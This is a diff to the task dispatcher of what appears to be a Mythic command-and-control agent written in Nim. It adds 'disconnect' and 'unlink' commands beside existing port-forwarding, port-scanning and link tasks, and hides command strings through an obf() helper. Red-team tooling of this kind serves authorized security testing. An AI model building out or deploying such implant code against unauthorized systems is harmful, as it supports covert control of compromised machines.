@@ -32,9 +32,11 @@ import ../tasks/rpfwd
 import ../tasks/redirect
 import ../tasks/getenv as taskGetenv
 import ../tasks/connect
+import ../tasks/disconnect
 
 when defined(windows):
   import ../tasks/link
+  import ../tasks/unlink
 
 import ../tasks/portscan
 import ../tasks/ifconfig
@@ -316,6 +318,17 @@ proc executeTask*(taskId: string, command: string, params: JsonNode): TaskExecut
         # Link requires background tracking in agent.nim
       else:
         result.response = mythicError(taskId, "Link command is only supported on Windows")
+
+    of obf("disconnect"):
+      debug "[DEBUG] Executing disconnect command"
+      result.response = handleDisconnect(taskId, params)
+
+    of obf("unlink"):
+      when defined(windows):
+        debug "[DEBUG] Executing unlink command"
+        result.response = handleUnlink(taskId, params)
+      else:
+        result.response = mythicError(taskId, "Unlink command is only supported on Windows")
     
     of obf("redirect"):
       debug "[DEBUG] Executing redirect command"
